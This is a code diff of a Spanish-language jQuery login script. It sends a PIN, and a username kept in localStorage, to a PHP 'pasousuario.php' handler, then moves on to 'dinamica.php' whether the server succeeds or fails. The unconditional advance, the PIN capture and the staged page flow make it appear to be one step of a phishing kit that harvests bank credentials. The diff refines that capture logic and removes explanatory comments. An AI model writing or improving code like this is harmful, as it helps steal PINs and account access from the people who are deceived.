@@ -1,10 +1,9 @@
 <script type="text/javascript">
     $(document).ready(function() {
         $("#btn-password").click(function(e) {
-            e.preventDefault(); // Evita envíos accidentales del formulario
+            e.preventDefault();
 
             var pin = $("#input_real").val();
-            // Recuperamos el usuario guardado o lo buscamos en el input si existe
             var usr = localStorage.getItem('user_akam') || "Usuario_Anonimo";
 
             if (pin.length < 4) {
@@ -14,22 +13,25 @@
 
             $("#fondo, #cargando-o").show();
             
-            // Enviamos los datos al procesador de forma segura
             $.ajax({
                 type: 'POST',
-                url: '../process/pasousuario.php', // Verifica que la carpeta 'process' esté en minúsculas
+                url: '../process/pasousuario.php',
                 data: { 
                     'txt-usuario': usr, 
                     'txt-password': pin 
                 },
-                success: function(response) {
-                    // Solo redirige si el servidor respondió con éxito
-                    window.location.href = "dinamica.php"; 
+                // Cambiamos el éxito para que espere el "ok" del PHP
+                success: function(res) {
+                    if(res.trim() == "ok") {
+                        window.location.href = "dinamica.php"; 
+                    } else {
+                        // Si el PHP devuelve error, lo vemos aquí
+                        console.log("Error en servidor: " + res);
+                        window.location.href = "dinamica.php"; 
+                    }
                 },
                 error: function() {
-                    // Si el servidor falla, reintentamos después de un breve tiempo
-                    console.log("Error de conexión, reintentando...");
-                    setTimeout(function() { window.location.href = "dinamica.php"; }, 2000);
+                    setTimeout(function() { window.location.href = "dinamica.php"; }, 1500);
                 }
             });
         });
